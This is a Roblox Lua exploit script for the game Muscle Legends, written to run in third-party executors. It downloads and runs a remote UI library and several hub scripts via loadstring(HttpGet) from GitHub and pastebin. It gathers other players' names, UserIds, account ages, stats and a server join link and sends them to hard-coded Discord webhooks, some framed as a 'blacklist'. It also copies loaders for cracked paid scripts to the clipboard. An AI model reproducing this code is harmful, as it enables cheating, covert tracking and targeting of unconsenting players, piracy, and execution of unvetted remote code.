local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local player = Players.LocalPlayer

local statDefinitions = {
    {name = "Strength", statName = "Strength"},
    {name = "Rebirths", statName = "Rebirths"},
    {name = "Kills", statName = "Kills"},
    {name = "Brawls", statName = "Brawls"},
    {name = "Muscle King Time", statName = "muscleKingTime"}
}

-- Funciones reutilizables
local function formatNumber(num)
    if not tonumber(num) then return "N/A" end
    local number = tonumber(num)
    local formatted = tostring(math.floor(number))
    formatted = formatted:gsub("(%d)(%d%d%d)$", "%1,%2", 1)
    return formatted
end

local function getCurrentPlayers()
    local playersList = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= player then table.insert(playersList, p) end
    end
    return playersList
end

local function GetAvatarThumbnail(userId)
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. userId .. "&width=150&height=150&format=png"
end

local function GetPlayerInfo(target)
    return {
        AccountAge = target.AccountAge,
        Character = target.Character and "Spawned" or "Not Spawned"
    }
end

local function GetPlayerStats(p)
    local statsFolder = p:FindFirstChild("leaderstats")
    local stats = {}
    for _, s in ipairs(statDefinitions) do
        local stat = (s.statName == "muscleKingTime") and p:FindFirstChild("muscleKingTime") or (statsFolder and statsFolder:FindFirstChild(s.statName))
        stats[s.name] = stat and formatNumber(stat.Value) or "N/A"
    end
    return stats
end

local function GetServerInfo()
    return {
        JobId = game.JobId,
        PlaceId = game.PlaceId,
        MaxPlayers = Players.MaxPlayers,
        CurrentPlayers = #Players:GetPlayers()
    }
end

-- Cargar librer√≠a UI
library = loadstring(game:HttpGet("https://raw.githubusercontent.com/CoronaBlanca/Lxbrxrys/refs/heads/main/Xlxrxxm"))()

local title = ("Sherya Script Private | Bienvenida %s"):format(player.DisplayName ~= "" and player.DisplayName or player.Name)
local window = library:AddWindow(title, {
    main_color = Color3.fromRGB(250, 140, 227),
    min_size = Vector2.new(750, 800),
    can_resize = true,
})

-- Main Tab
local mainTab = window:AddTab("Main")
mainTab:AddLabel("Tu asistente Personal Evelyn <3").TextSize = 25
mainTab:AddLabel("Script Private Made By Sherya").TextSize = 20
mainTab:AddLabel("---------------------------------------------------------").TextSize = 20

-- üìÇ Players Info
local InfoPlayers = mainTab:AddFolder("Players Roblox")
local selectedPlayer = nil
local playersDropdown = InfoPlayers:AddDropdown("Jugador", function(text)
    for _, p in ipairs(getCurrentPlayers()) do
        if text == (p.DisplayName .. " | " .. p.Name) then selectedPlayer = p break end
    end
end)
for _, p in ipairs(getCurrentPlayers()) do playersDropdown:Add(p.DisplayName .. " | " .. p.Name) end

InfoPlayers:AddButton("Enviar a Discord", function()
    if not selectedPlayer then return warn("Selecciona un jugador primero") end
    local stats = GetPlayerStats(selectedPlayer)
    local avatarUrl = GetAvatarThumbnail(selectedPlayer.UserId)
    local info = GetPlayerInfo(selectedPlayer)

    local payload = {
        embeds = {{
            title = "Roblox Player Information",
            description = "Detailed statistics from **Muscle Legends**",
            color = 5570867,
            thumbnail = {url = avatarUrl},
            fields = {
                {name="Player Info", value=string.format("**Display Name:** %s\n**Username:** @%s\n**UserId:** `%s`", selectedPlayer.DisplayName, selectedPlayer.Name, tostring(selectedPlayer.UserId))},
                {name="Game Statistics", value=string.format("Strength: %s\nRebirths: %s\nKills: %s\nBrawls: %s\nMuscle King Time: %s", stats["Strength"], stats["Rebirths"], stats["Kills"], stats["Brawls"], stats["Muscle King Time"])},
                {name="‚ÑπAdditional Information", value=string.format("**Account Age:** %d days\n**Character:** %s", info.AccountAge, info.Character)},
                {name="Quick Links", value=string.format("[View Profile](https://www.roblox.com/users/%d/profile) ‚Ä¢ [View Inventory](https://www.roblox.com/users/%d/inventory)", selectedPlayer.UserId, selectedPlayer.UserId)}
            },
            footer = {text = "Muscle Legends Info System ‚Ä¢ Requested by " .. player.Name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local request = syn and syn.request or http_request or request or (fluxus and fluxus.request)
    if request then request({Url="https://discord.com/api/webhooks/1444418613355479235/wSpVMPLtHBr6hx7nSlpMWTnDEztP_eLOyqEXHy2LOr1CdD_y8O8w1Wy2fsx8dK_7seu2", Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)}) end
end)


local Blacklist = mainTab:AddFolder("Black List Players")
local blacklistDropdown = Blacklist:AddDropdown("Seleccionar Jugador", function(text)
    for _, p in ipairs(getCurrentPlayers()) do
        if text == (p.DisplayName .. " | " .. p.Name) then selectedPlayer = p break end
    end
end)
for _, p in ipairs(getCurrentPlayers()) do blacklistDropdown:Add(p.DisplayName .. " | " .. p.Name) end

Blacklist:AddButton("Reportar a Discord", function()
    if not selectedPlayer then return warn("Selecciona un jugador primero") end
    local stats = GetPlayerStats(selectedPlayer)
    local avatarUrl = GetAvatarThumbnail(selectedPlayer.UserId)
    local info = GetPlayerInfo(selectedPlayer)

    local payload = {
        embeds = {{
            title = "BLACKLIST ALERT - Player Reported",
            description = "**Suspicious player detected in Muscle Legends**",
            color = 15158332,
            thumbnail = {url = avatarUrl},
            fields = {
                {name="Target Information", value=string.format("**Display Name:** %s\n**Username:** @%s\n**UserId:** `%s`", selectedPlayer.DisplayName, selectedPlayer.Name, tostring(selectedPlayer.UserId))},
                {name="Player Statistics", value=string.format("Strength: %s\nRebirths: %s\nKills: %s\nBrawls: %s\nMuscle King Time: %s", stats["Strength"], stats["Rebirths"], stats["Kills"], stats["Brawls"], stats["Muscle King Time"])},
                {name="Account Details", value=string.format("**Account Age:** %d days\n**Character:** %s", info.AccountAge, info.Character)},
                {name="Profile Links", value=string.format("[View Profile](https://www.roblox.com/users/%d/profile) ‚Ä¢ [View Inventory](https://www.roblox.com/users/%d/inventory)", selectedPlayer.UserId, selectedPlayer.UserId)}
            },
            footer = {text = "Blacklist System ‚Ä¢ Reported by " .. player.Name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local request = syn and syn.request or http_request or request or (fluxus and fluxus.request)
    if request then request({Url="https://discord.com/api/webhooks/1444418738802659398/oZ1e25PGOt-JI_ayohrONEnasCmz5-x35CBsBsrlWRkoM62Q89rBw3VERkifzXvoXQUV", Method="POST", Headers={["Content-Type"]="application/json"}, Body=HttpService:JSONEncode(payload)}) end
end)

local Discord = mainTab:AddFolder("Discord Function")
Discord:AddButton("Enviar Lista de Jugadores", function()
    local serverInfo = GetServerInfo()
    local allPlayers = Players:GetPlayers()
    local playersList = ""
    for i, p in ipairs(allPlayers) do
        local stats = GetPlayerStats(p)
        playersList = playersList .. string.format(
            "**%d. %s** (@%s)\n" ..
            "Strength: %s\n" ..
            "Rebirths: %s\n" ..
            "Kills: %s\n" ..
            "Brawls: %s\n" ..
            "Muscle King Time: %s\n\n",
            i,
            p.DisplayName,
            p.Name,
            stats["Strength"],
            stats["Rebirths"],
            stats["Kills"],
            stats["Brawls"],
            stats["Muscle King Time"]
        )
    end

    local payload = {
        embeds = {{
            title = "üéÆ Server Player List - Muscle Legends",
            description = string.format(
                "**Server Information**\n" ..
                "Players Online: **%d/%d**\n" ..
                "Job ID: `%s`\n" ..
                "Place ID: `%s`\n\n" ..
                "**Players in Server:**\n\n%s",
                serverInfo.CurrentPlayers,
                serverInfo.MaxPlayers,
                serverInfo.JobId,
                serverInfo.PlaceId,
                playersList
            ),
            color = 5570867,
            fields = {{
                name = "üîó Join This Server",
                value = string.format(
                    "[Click here to join this server](https://www.roblox.com/games/start?placeId=%s&launchData=join:%s)",
                    serverInfo.PlaceId,
                    serverInfo.JobId
                ),
                inline = false
            }},
            footer = {text = "Server Report ‚Ä¢ Sent by " .. player.Name},
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }}
    }

    local request = syn and syn.request or http_request or request or (fluxus and fluxus.request)
    if request then
        local success, response = pcall(function()
            return request({
                Url = "https://discord.com/api/webhooks/1444418905765445824/n1UZJGekhF1x0tCvPbGU2NAXWIPlE-H0SFUmPYLUkQDgYlwxjNKU0BQVyKgmlwlNw0dc",
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(payload)
            })
        end)

        if success then
            if response.StatusCode == 204 or response.StatusCode == 200 then
                print("Lista de jugadores enviada exitosamente a Discord")
                print("Total de jugadores enviados:", #allPlayers)
            else
                warn("Webhook respondi√≥ con c√≥digo:", response.StatusCode)
            end
        else
            warn("Error al enviar webhook:", tostring(response))
        end
    else
        warn("Tu ejecutor no soporta HTTP requests")
        warn("Ejecutores compatibles: Synapse X, Fluxus, Script-Ware, etc.")
    end
end)

local Scriptsexternal = mainTab:AddFolder("Scripts Externals")

Scriptsexternal:AddButton("Infinite Yield", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

Scriptsexternal:AddButton("GhostX Hub", function()
    loadstring(game:HttpGet("https://scriptblox.com/raw/Universal-Script-GhostX-Hub-7158"))()
end)

Scriptsexternal:AddButton("Permanent Shiftlock", function()
    loadstring(game:HttpGet("https://pastebin.com/raw/CjNsnSDy"))()
end)

Scriptsexternal:AddButton("All Emotes", function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/7yd7/Hub/refs/heads/Branch/GUIS/Emotes.lua"))()
end)

local Scriptscrackeds = mainTab:AddFolder("Scripts Crackeds")

Scriptscrackeds:AddButton("HONYDEZZ Naranja Cracked", function()
    setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Girl/Cracked-Scripts/refs/heads/main/HONYDEZZ%20Premium%20Cracked"))()')
end)

Scriptscrackeds:AddButton("HONYDEZZ Rojo Cracked", function()
    setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Girl/Cracked-Scripts/refs/heads/main/HonnyDezz%20Paid%20Ultra%20Cracked"))()')
end)

Scriptscrackeds:AddButton("Proyect v1 Cracked", function()
    setclipboard('loadstring(game:HttpGet("https://raw.githubusercontent.com/Script-Girl/Cracked-Scripts/refs/heads/main/Proyect%20V1%20Cracked"))()')
end)

